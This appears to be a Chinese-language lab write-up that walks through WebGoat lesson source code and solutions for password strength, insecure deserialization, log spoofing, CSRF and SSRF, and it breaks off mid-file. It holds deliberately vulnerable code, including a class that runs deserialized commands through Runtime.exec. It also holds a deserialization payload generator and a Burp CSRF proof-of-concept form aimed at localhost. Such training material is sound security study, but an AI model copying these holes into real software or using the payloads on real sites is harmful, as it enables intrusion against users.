![image-20220914160540114](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914160540114.png)

我们接着跟下去看看

这里的话其实是在模拟tom去手动点击这个email地址

![image-20220914160722785](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914160722785.png)

这里就可以看到了 这个host是一路跟下来的

![image-20220914160828768](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914160828768.png)

那么就会发送请求到webwolf中去

![image-20220914161038589](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914161038589.png)

拿到uuid去更改tom的密码

![image-20220914161158331](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914161158331.png)

接着去登录tom

![image-20220914161228192](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914161228192.png)

## secure_passwords

### SecurePasswords

```java
package com.wanan.webgoat.lessons.secure_passwords;

import com.wanan.webgoat.container.lessons.Category;
import com.wanan.webgoat.container.lessons.Lesson;
import org.springframework.stereotype.Component;

@Component
public class SecurePasswords extends Lesson {
    @Override
    protected Category getDefaultCategory() {
        return Category.A7;
    }

    @Override
    public String getTitle() {
        return "secure-passwords.title";
    }
}
```

### SecurePasswordsAssignment

```java
package com.wanan.webgoat.lessons.secure_passwords;

import com.nulabinc.zxcvbn.Strength;
import com.nulabinc.zxcvbn.Zxcvbn;
import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AttackResult;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

import java.text.DecimalFormat;
import java.text.DecimalFormatSymbols;
import java.util.Locale;

@RestController
public class SecurePasswordsAssignment extends AssignmentEndpoint {

    @PostMapping("SecurePasswords/assignment")
    @ResponseBody
    public AttackResult completed(@RequestParam String password) {
        Zxcvbn zxcvbn = new Zxcvbn();
//        这个是一个开源项目 其中主要是用来判定你的密码强度
        StringBuffer output = new StringBuffer();
        DecimalFormat df = new DecimalFormat("0", DecimalFormatSymbols.getInstance(Locale.ENGLISH));
        df.setMaximumFractionDigits(340);
//        这里像是处理小数点的操作
        Strength strength = zxcvbn.measure(password);
//      获取password的强度
        output.append("<b>Your Password: *******</b></br>");
        output.append("<b>Length: </b>" + password.length() + "</br>");
        output.append("<b>Estimated guesses needed to crack your password: </b>" + df.format(strength.getGuesses()) + "</br>");
        output.append("<div style=\"float: left;padding-right: 10px;\"><b>Score: </b>" + strength.getScore() + "/4 </div>");
        if (strength.getScore() <= 1) {
            output.append("<div style=\"background-color:red;width: 200px;border-radius: 12px;float: left;\">&nbsp;</div></br>");
        } else if (strength.getScore() <= 3) {
            output.append("<div style=\"background-color:orange;width: 200px;border-radius: 12px;float: left;\">&nbsp;</div></br>");
        } else {
            output.append("<div style=\"background-color:green;width: 200px;border-radius: 12px;float: left;\">&nbsp;</div></br>");
        }
        output.append("<b>Estimated cracking time: </b>" + calculateTime((long) strength.getCrackTimeSeconds().getOnlineNoThrottling10perSecond()) + "</br>");
        if (strength.getFeedback().getWarning().length() != 0)
            output.append("<b>Warning: </b>" + strength.getFeedback().getWarning() + "</br>");
        if (strength.getFeedback().getSuggestions().size() != 0) {
            output.append("<b>Suggestions:</b></br><ul>");
            for (String sug : strength.getFeedback().getSuggestions()) output.append("<li>" + sug + "</li>");
            output.append("</ul></br>");
        }
        output.append("<b>Score: </b>" + strength.getScore() + "/4 </br>");

        if (strength.getScore() >= 4)
            return success(this).feedback("securepassword-success").output(output.toString()).build();
        else
            return failed(this).feedback("securepassword-failed").output(output.toString()).build();
    }

    public static String calculateTime(long seconds) {
//        这里是对时间进行格式化输出
        int s = 1;
        int min = (60 * s);
        int hr = (60 * min);
        int d = (24 * hr);
        int yr = (365 * d);

        long years = seconds / (d) / 365;
        long days = (seconds % yr) / (d);
        long hours = (seconds % d) / (hr);
        long minutes = (seconds % hr) / (min);
        long sec = (seconds % min * s);

        return (years + " years " + days + " days " + hours + " hours " + minutes + " minutes " + sec + " seconds");
    }
}
```

![image-20220914170132735](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914170132735.png)

## deserialization

### InsecureDeserialization

```java
package com.wanan.webgoat.lessons.deserialization;

import com.wanan.webgoat.container.lessons.Category;
import com.wanan.webgoat.container.lessons.Lesson;
import org.springframework.stereotype.Component;

@Component
public class InsecureDeserialization extends Lesson {
    @Override
    protected Category getDefaultCategory() {
        return Category.A8;
    }

    @Override
    public String getTitle() {
        return "insecure-deserialization.title";
    }
}
```

### InsecureDeserializationTask

```java
package com.wanan.webgoat.lessons.deserialization;

import com.wanan.dummy.insecure.framework.VulnerableTaskHolder;
import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InvalidClassException;
import java.io.ObjectInputStream;
import java.util.Base64;

@RestController
@AssignmentHints({"insecure-deserialization.hints.1", "insecure-deserialization.hints.2", "insecure-deserialization.hints.3"})
public class InsecureDeserializationTask extends AssignmentEndpoint {
    @PostMapping("/InsecureDeserialization/task")
    @ResponseBody
    public AttackResult completed(@RequestParam String token) throws IOException{
        String b64token;
        long before;
        long after;
        int delay;
        b64token = token.replace('-','+').replace('_','/');
//        首先替换下token
        try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(b64token)))){
//            进行base64解密 并读到输入流中
            before = System.currentTimeMillis();
//            获取执行前时间
            Object o = ois.readObject();
//            反序列化开始
            if (!(o instanceof VulnerableTaskHolder)){
//                如果 反序列化对象不属于 VulnerableTaskHolder
                if (o instanceof String){
                    return failed(this).feedback("insecure-deserialization.stringobject").build();
                }
                return failed(this).feedback("insecure-deserialization.wrongobject").build();
            }
            after = System.currentTimeMillis();
//            接着获取当前的时间
        }catch (InvalidClassException e){
            return failed(this).feedback("insecure-deserialization.invalidversion").build();
        }catch (IllegalArgumentException e){
            return failed(this).feedback("insecure-deserialization.expired").build();
        }catch (Exception e){
            return failed(this).feedback("insecure-deserialization.invalidversion").build();
        }
        delay = (int) (after - before);
        if (delay > 7000){
            return failed(this).build();
        }
        if (delay < 3000){
            return failed(this).build();
        }
        return success(this).build();

    }
}
```

#### VulnerableTaskHolder

这里相当于写了一个危险类 让我们了解反序列化漏洞

![image-20220914201751549](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914201751549.png)

```java
package com.wanan.dummy.insecure.framework;

import lombok.extern.slf4j.Slf4j;

import java.io.*;
import java.time.LocalDateTime;

@Slf4j
public class VulnerableTaskHolder implements Serializable {
    private static final  long serialVersionUID =2;
    private String taskName;
    private String taskAction;
    private LocalDateTime requestedExecutionTime;

    public VulnerableTaskHolder(String taskName, String taskAction) {
        super();
        this.taskName = taskName;
        this.taskAction = taskAction;
        this.requestedExecutionTime = LocalDateTime.now();
    }
    @Override
    public String toString(){
        return "VulnerableTaskHolder [taskName=" + taskName + ", taskAction=" + taskAction + ", requestedExecutionTime="
                + requestedExecutionTime + "]";
    }
    private void readObject(ObjectInputStream stream) throws Exception{
        stream.defaultReadObject();
        log.info("restoring task: {}",taskName);
        log.info("restoring time: {}",taskAction);

        if (requestedExecutionTime != null && (requestedExecutionTime.isBefore(LocalDateTime.now().minusMinutes(10)) || requestedExecutionTime.isAfter(LocalDateTime.now()))){
            log.debug(this.toString());
            throw new IllegalStateException("outdated");
        }
        if ((taskAction.startsWith("sleep") || taskAction.startsWith("ping")) && taskAction.length() < 22 ){
            log.info("about to execute: {}",taskAction);
            try {
                Process p = Runtime.getRuntime().exec(taskAction);
//                这里就是去执行这个命令了 不过我们这里需要延时5秒
                BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String  line = null;
                while ((line = in.readLine()) != null){
                    log.info(line);
                }
            }catch (IOException e){
                log.error("IO Exception",e);
            }
        }
    }
}

```

这里就是一个超级简单的反序列化 写一下反序列化利用链

```java
package com.wanan.dummy.insecure.framework;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.Base64;

public class Unserlize {
    public static void main(String[] args) throws Exception {
        VulnerableTaskHolder vulnerableTaskHolder = new VulnerableTaskHolder("ping","ping -n 4 127.0.0.1");

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(vulnerableTaskHolder);
        byte[] bytes = byteArrayOutputStream.toByteArray();
        System.out.println(Base64.getEncoder().encodeToString(bytes));

    }
}
```

![image-20220914205500174](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914205500174.png)

填进去就过关

![image-20220914205629800](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914205629800.png)

## logging

### LogSpoofing

```java
package com.wanan.webgoat.lessons.logging;

import com.wanan.webgoat.container.lessons.Category;
import com.wanan.webgoat.container.lessons.Lesson;
import org.springframework.stereotype.Component;

@Component
public class LogSpoofing extends Lesson {
    @Override
    protected Category getDefaultCategory() {
        return Category.A9;
    }

    @Override
    public String getTitle() {
        return "logging.title";
    }
}
```

### LogSpoofingTask

```java
package com.wanan.webgoat.lessons.logging;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AttackResult;
import org.apache.logging.log4j.util.Strings;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class LogSpoofingTask extends AssignmentEndpoint {
    @PostMapping("/LogSpoofing/log-spoofing")
    @ResponseBody
    public AttackResult completed(@RequestParam String username,@RequestParam String password){
        if (Strings.isEmpty(username)){
            return failed(this).output(username).build();
        }
        username = username.replace("\n","<br/>");
        if (username.contains("<p>") || username.contains("<div>")){
            return failed(this).output("Try to think of something simple ").build();
        }
        if (username.indexOf("<br/>") < username.indexOf("admin")){
            return success(this).output(username).build();
        }
        return failed(this).output(username).build();
    }
}
```

没看懂这关要干嘛  输admin 就过

![image-20220914211141231](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914211141231.png)

### LogBleedingTask

```java
package com.wanan.webgoat.lessons.logging;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AttackResult;
import org.apache.logging.log4j.util.Strings;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

import javax.annotation.PostConstruct;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.UUID;

@RestController
public class LogBleedingTask extends AssignmentEndpoint {
    Logger log = LoggerFactory.getLogger(this.getClass().getName());
    private String password;

    @PostConstruct
    public void  generatePassword(){
        password = UUID.randomUUID().toString();
        log.info("Password for admin: {}", Base64.getEncoder().encodeToString(password.getBytes(StandardCharsets.UTF_8)));
    }

    @PostMapping("/LogSpoofing/log-bleeding")
    @ResponseBody
    public AttackResult completed(@RequestParam String username,@RequestParam String password){
        if (Strings.isEmpty(username) || Strings.isEmpty(password)){
            return failed(this).output("Please provide username (Admin) and password").build();
        }
        if (username.equals("Admin") && password.equals(this.password)){
            return success(this).build();
        }
        return failed(this).build();
    }
}
```

这里让我们查日志 其实应该器linux机器上面查的 这里就先不搞了

![image-20220914211821022](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914211821022.png)

![image-20220914211829938](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914211829938.png)

![image-20220914211841561](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914211841561.png)

![image-20220914211908537](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914211908537.png)

## csrf

### CSRF

```java
package com.wanan.webgoat.lessons.csrf;

import com.wanan.webgoat.container.lessons.Category;
import com.wanan.webgoat.container.lessons.Lesson;
import org.springframework.stereotype.Component;

@Component
public class CSRF extends Lesson {
    @Override
    protected Category getDefaultCategory() {
        return Category.A10;
    }

    @Override
    public String getTitle() {
        return "csrf.title";
    }
}
```

### CSRFConfirmFlag1

```java
package com.wanan.webgoat.lessons.csrf;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import com.wanan.webgoat.container.session.UserSessionData;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

@RestController
@AssignmentHints({"csrf-get.hint1", "csrf-get.hint2", "csrf-get.hint3", "csrf-get.hint4"})
public class CSRFConfirmFlag1 extends AssignmentEndpoint {

    @Autowired
    UserSessionData userSessionData;

    @PostMapping(path = "/csrf/confirm-flag-1",produces = {"application/json"})
    @ResponseBody
    public AttackResult completed(String confirmFlagVal){
        Object userSessionDataStr = userSessionData.getValue("csrf-get-success");
        if (userSessionDataStr != null && confirmFlagVal.equals(userSessionDataStr.toString())){
            return success(this)
                    .feedback("csrf-get-null-referer.success")
                    .output("Correct, the flag was " + userSessionData.getValue("csrf-get-success"))
                    .build();
        }
        return failed(this).build();
    }
}
```

### CSRFGetFlag

```java
package com.wanan.webgoat.lessons.csrf;

import com.wanan.webgoat.container.i18n.PluginMessages;
import com.wanan.webgoat.container.session.UserSessionData;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.http.HttpServletRequest;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;

@RestController
public class CSRFGetFlag {
    @Autowired
    UserSessionData userSessionData;
    @Autowired
    private PluginMessages pluginMessages;

    @RequestMapping(path = "/csrf/basic-get-flag",produces = {"application/json"},method = RequestMethod.POST)
    @ResponseBody
    public Map<String,Object> invoke(HttpServletRequest req){
        Map<String,Object> response = new HashMap<>();
        String host = (req.getHeader("host") == null) ? "NULL": req.getHeader("host");
        String referer = (req.getHeader("referer") == null) ? "NULL" : req.getHeader("referer");
        String[] refererArr = referer.split("/");

        if (referer.equals("NULL")){
            if ("true".equals(req.getParameter("csrf"))){
                Random random = new Random();
                userSessionData.setValue("csrf-get-success",random.nextInt(65536));
                response.put("success",true);
                response.put("message",pluginMessages.getMessage("csrf-get-null-referer.success"));
                response.put("flag",userSessionData.getValue("csrf-get-success"));

            }
        }else if (refererArr[2].equals(host)){
            response.put("success",false);
            response.put("message","Appears the request came from the original host");
            response.put("flag",null);
        }else {
            Random random = new Random();
            userSessionData.setValue("csrf-get-success",random.nextInt(65536));
            response.put("success",null);
            response.put("message",pluginMessages.getMessage("csrf-get-other-referer.success"));
            response.put("flag",userSessionData.getValue("csrf-get-success"));
        }
        return response;
    }
}
```

这里如果直接访问的话就会导致同一个host 这里我们需要做的是将我们写的恶意的链接发送给受害者,而不是让受害者在原先正常的链接上去请求

![image-20220914220420551](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914220420551.png)

这里直接截取一个数据包 然后使用burp生成一个csrf表单

![image-20220914220557068](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914220557068.png)

![image-20220914220621795](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914220621795.png)

我们在本地生成一个csrf.html文件并将内容填入进去

来到webwolf上传文件并获取一个url

![image-20220914220901885](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914220901885.png)

然后就是我们需要将这个url发送给受害者去点击 当然这里可以做成自动的点击操作

![image-20220914220941291](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914220941291.png)

填入获取到的flag即可

![image-20220914221015044](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914221015044.png)

### ForgedReviews

```java
package com.wanan.webgoat.lessons.csrf;

import com.google.common.collect.Lists;
import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import com.wanan.webgoat.container.session.WebSession;
import org.joda.time.DateTime;
import org.joda.time.format.DateTimeFormat;
import org.joda.time.format.DateTimeFormatter;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.MediaType;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.http.HttpServletRequest;
import java.util.*;

import static org.springframework.http.MediaType.ALL_VALUE;

@RestController
@AssignmentHints({"csrf-review-hint1", "csrf-review-hint2", "csrf-review-hint3"})
public class ForgedReviews extends AssignmentEndpoint {
    @Autowired
    private WebSession webSession;
    private static DateTimeFormatter fmt = DateTimeFormat.forPattern("yyyy-MM-dd, HH:mm:ss");
    private static final Map<String, List<Review>> userReviews = new HashMap<>();
    private static final List<Review> REVIEWS = new ArrayList<>();
    private static final String weakAntiCSRF = "2aa14227b9a13d0bede0388a7fba9aa9";

    static {
        REVIEWS.add(new Review("secUriTy", DateTime.now().toString(fmt), "This is like swiss cheese", 0));
        REVIEWS.add(new Review("webgoat", DateTime.now().toString(fmt), "It works, sorta", 2));
        REVIEWS.add(new Review("guest", DateTime.now().toString(fmt), "Best, App, Ever", 5));
        REVIEWS.add(new Review("guest", DateTime.now().toString(fmt), "This app is so insecure, I didn't even post this review, can you pull that off too?", 1));
    }
    @GetMapping(path = "/csrf/review",produces = MediaType.APPLICATION_JSON_VALUE,consumes = ALL_VALUE)
    @ResponseBody
    public Collection<Review> retrieveReviews(){
        Collection<Review> allReviews = Lists.newArrayList();
        Collection<Review> newReviews = userReviews.get(webSession.getUserName());
        if (newReviews != null){
            allReviews.addAll(newReviews);
        }
        allReviews.addAll(REVIEWS);
        return allReviews;
    }

    @PostMapping("/csrf/review")
    @ResponseBody
    public AttackResult createNewReview(String reviewText, Integer starts , String validateReq, HttpServletRequest request){
        final String host = (request.getHeader("host") ==null) ?"NULL":request.getHeader("host");
        final String referer = (request.getHeader("referer") ==null)?"NULL" :request.getHeader("referer");
        final String[] refererArr =referer.split("/");
        Review review = new Review();
        review.setText(reviewText);
        review.setDateTime(DateTime.now().toString(fmt));
        review.setUser(webSession.getUserName());
        review.setStars(starts);
        var reviews = userReviews.getOrDefault(webSession.getUserName(),new ArrayList<>());
        reviews.add(review);
        userReviews.put(webSession.getUserName(),reviews);
        if (validateReq != "NULL" && refererArr[2].equals(host)){
            return failed(this).feedback("csrf-same-host").build();
        }else {
            return success(this).feedback("csrf-review.success").build();
        }
    }

}
```

### Review

```java
package com.wanan.webgoat.lessons.csrf;

import lombok.AllArgsConstructor;
import lombok.Getter;
import lombok.NoArgsConstructor;
import lombok.Setter;

import javax.xml.bind.annotation.XmlRootElement;

@Setter
@Getter
@AllArgsConstructor
@NoArgsConstructor
@XmlRootElement
public class Review {
    private String user;
    private String dateTime;
    private String  text;
    private Integer stars;
}
```

![image-20220914224458214](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914224458214.png)

还是类似的操作

![image-20220914224523769](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914224523769.png)

### CSRFFeedback

```java
package com.wanan.webgoat.lessons.csrf;

import com.fasterxml.jackson.databind.DeserializationFeature;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import com.wanan.webgoat.container.session.UserSessionData;
import org.apache.commons.lang3.exception.ExceptionUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.MediaType;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.util.Map;
import java.util.UUID;

@RestController
@AssignmentHints({"csrf-feedback-hint1", "csrf-feedback-hint2", "csrf-feedback-hint3"})
public class CSRFFeedback extends AssignmentEndpoint {
    @Autowired
    private UserSessionData userSessionData;
    @Autowired
    private ObjectMapper objectMapper;

    @PostMapping(value = "/csrf/feedback/message",produces = {"application/json"})
//    这里需要的是json格式的数据
    @ResponseBody
    public AttackResult completed(HttpServletRequest request , @RequestBody String feedback){
        try {
            objectMapper.enable(DeserializationFeature.FAIL_ON_IGNORED_PROPERTIES);
            objectMapper.enable(DeserializationFeature.FAIL_ON_NULL_FOR_PRIMITIVES);
            objectMapper.enable(DeserializationFeature.FAIL_ON_NUMBERS_FOR_ENUMS);
            objectMapper.enable(DeserializationFeature.FAIL_ON_READING_DUP_TREE_KEY);
            objectMapper.enable(DeserializationFeature.FAIL_ON_MISSING_CREATOR_PROPERTIES);
            objectMapper.enable(DeserializationFeature.FAIL_ON_TRAILING_TOKENS);
            objectMapper.readValue(feedback.getBytes(), Map.class);
        }catch (IOException e){
            return failed(this).feedback(ExceptionUtils.getStackTrace(e)).build();
        }
        boolean correctCSRF = requestContainsWebGoatCookie(request.getCookies()) && request.getContentType().contains(MediaType.TEXT_PLAIN_VALUE);
        correctCSRF &= hostOrRefererDifferentHost(request);
        if (correctCSRF){
            String flag = UUID.randomUUID().toString();
            userSessionData.setValue("csrf-feedback",flag);
            return success(this).feedback("csrf-feedback-success").feedbackArgs(flag).build();
        }
        return failed(this).build();
    }
    @PostMapping(path = "/csrf/feedback", produces = "application/json")
    @ResponseBody
    public AttackResult flag(@RequestParam("confirmFlagVal") String flag) {
        if (flag.equals(userSessionData.getValue("csrf-feedback"))) {
            return success(this).build();
        } else {
            return failed(this).build();
        }
    }

    private boolean hostOrRefererDifferentHost(HttpServletRequest request) {
        String referer = request.getHeader("Referer");
        String host = request.getHeader("Host");
        if (referer != null){
            return !referer.contains(host);
        }else {
            return true;
        }
    }

    private boolean requestContainsWebGoatCookie(Cookie[] cookies) {
        if (cookies != null){
            for (Cookie c : cookies){
                if (c.getName().equals("JSESSIONID")){
                    return true;
                }
            }
        }
        return false;
    }
}

```

这里很明显需要发送的是json格式的数据

![image-20220915115051056](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220915115051056.png)

我们先按照之前的步骤走走看

![image-20220915115922082](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220915115922082.png)

这里就发现发送的请求就很奇怪 多了个= 我们看看怎么回事

![image-20220915120033416](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220915120033416.png)

这里有一个name 和 一个 value  其中的value 是空 也就是导致构造出来的post 表单是 (name) =  这种形式 因此导致多出个 = 

![image-20220915121347911](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220915121347911.png)

这里我们进行构造 可以看到这里我们把这个系统添加的 = 给利用进去了

<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220915134615657.png" alt="image-20220915134615657" style="zoom:150%;" />

```html
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form action="http://127.0.0.1:8081/WebGoat/csrf/feedback/message" method="POST" encType="text/plain">
  <input type="hidden" name='
{"name":"WebGoat","email":"webgoat@webgoat.org","subject":"na","message":"WebGoat is the best!!'
         value='"}'/>
  <input type="submit" value="Submit request"/>
</form>
</body>
</html>
```

我们重新发送看看

![image-20220915135148391](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220915135148391.png)

![image-20220915135218882](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220915135218882.png)

### CSRFLogin

```java
package com.wanan.webgoat.lessons.csrf;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import com.wanan.webgoat.container.users.UserTracker;
import com.wanan.webgoat.container.users.UserTrackerRepository;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.http.HttpServletRequest;

@RestController
@AssignmentHints({"csrf-login-hint1", "csrf-login-hint2", "csrf-login-hint3"})
public class CSRFLogin extends AssignmentEndpoint {
    private final UserTrackerRepository userTrackerRepository;

    public CSRFLogin(UserTrackerRepository userTrackerRepository) {
        this.userTrackerRepository = userTrackerRepository;
    }

    @PostMapping(path = "/csrf/login",produces = {"application/json"})
    @ResponseBody
    public AttackResult completed(HttpServletRequest request){
        String userName = request.getUserPrincipal().getName();
        if (userName.startsWith("csrf")){
            markAssignmentSolvedWithRealUser(userName);
            return success(this).feedback("csrf-login-success").build();

        }
        return failed(this).feedback("csrf-login-failed").feedbackArgs(userName).build();
    }

    private void markAssignmentSolvedWithRealUser(String userName) {
        UserTracker userTracker = userTrackerRepository.findByUser(userName);
        userTracker.assignmentSolved(getWebSession().getCurrentLesson(), this.getClass().getSimpleName());
        userTrackerRepository.save(userTracker);
    }
}
```

这里的csrf 是在测试webgoat的登录界面是否存在csrf漏洞 

注册一个以cstf开头的用户名 其中的密码是你自己设置的

![image-20220915140710128](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220915140710128.png)

在登录时创建一个 csrf.html

![image-20220915140820418](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220915140820418.png)

上传 将链接发送给受害者 

![image-20220915140936756](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220915140936756.png)

当受害者点击 链接的时候就登录了 我们 csrf-123456 这个账号了

![image-20220915141034347](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220915141034347.png)

![image-20220915141058633](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220915141058633.png)

也就是说这里 如果受害者没有发现这个账号不是他本人的 那么他的操作都会被我们给记录下来

## ssrf

### SSRF

```java
package com.wanan.webgoat.lessons.ssrf;

import com.wanan.webgoat.container.lessons.Category;
import com.wanan.webgoat.container.lessons.Lesson;
import org.springframework.stereotype.Component;

@Component
public class SSRF extends Lesson {
    @Override
    protected Category getDefaultCategory() {
        return Category.A10;
    }

    @Override
    public String getTitle() {
        return "ssrf.title";
    }
}
```

### SSRFTask1

```java
package com.wanan.webgoat.lessons.ssrf;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

@RestController
@AssignmentHints({"ssrf.hint1", "ssrf.hint2"})
public class SSRFTask1 extends AssignmentEndpoint {
    @PostMapping("/SSRF/task1")
    @ResponseBody
    public AttackResult completed(@RequestParam String url){
        return stealTheCheese(url);
    }
    protected AttackResult stealTheCheese(String url){
        try {
            StringBuffer html = new StringBuffer();
            if (url.matches("images/tom.png")){
                html.append("<img class=\"image\" alt=\"Tom\" src=\"images/tom.png\" width=\"25%\" height=\"25%\">");
                return failed(this)
                        .feedback("ssrf.tom")
                        .output(html.toString())
                        .build();
            } else if (url.matches("images/jerry.png")) {
                html.append("<img class=\"image\" alt=\"Jerry\" src=\"images/jerry.png\" width=\"25%\" height=\"25%\">");
                return success(this)
                        .feedback("ssrf.success")
                        .output(html.toString())
                        .build();
            }else {
                html.append("<img class=\"image\" alt=\"Silly Cat\" src=\"images/cat.jpg\">");
                return failed(this)
                        .feedback("ssrf.failure")
                        .output(html.toString())
                        .build();
            }
        }catch (Exception e){
            e.printStackTrace();
            return failed(this)
                    .output(e.getMessage())
                    .build();
        }
    }
}
```

修改url 为 images%2Fjerry.png 过关 ? 这叫ssrf?

![image-20220915143011264](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220915143011264.png)

![image-20220915143058663](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220915143058663.png)

### SSRFTask2

```java
package com.wanan.webgoat.lessons.ssrf;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

import java.io.IOException;
import java.io.InputStream;
import java.net.MalformedURLException;
import java.net.URL;
import java.nio.charset.StandardCharsets;

@RestController
@AssignmentHints({"ssrf.hint3"})
public class SSRFTask2 extends AssignmentEndpoint {
    
    @PostMapping("/SSRF/task2")
    @ResponseBody
    public AttackResult completed(@RequestParam String url){
        return fulBall(url);
    }
    protected AttackResult fulBall(String url){
        if (url.matches("http://ifconfig.pro")){
            String html;
            try (InputStream in  = new URL(url).openStream()){
//                这里比较好理解 就是初始化了一个url读入流去读取数据 这里当然会存在ssrf了
                html = new String(in.readAllBytes(), StandardCharsets.UTF_8)
                        .replace("\n","<br>");
            }catch (MalformedURLException e){
                return getFailedResult(e.getMessage());
            }catch (IOException e){
                html = "<html><body>Although the http://ifconfig.pro site is down, you still managed to solve" +
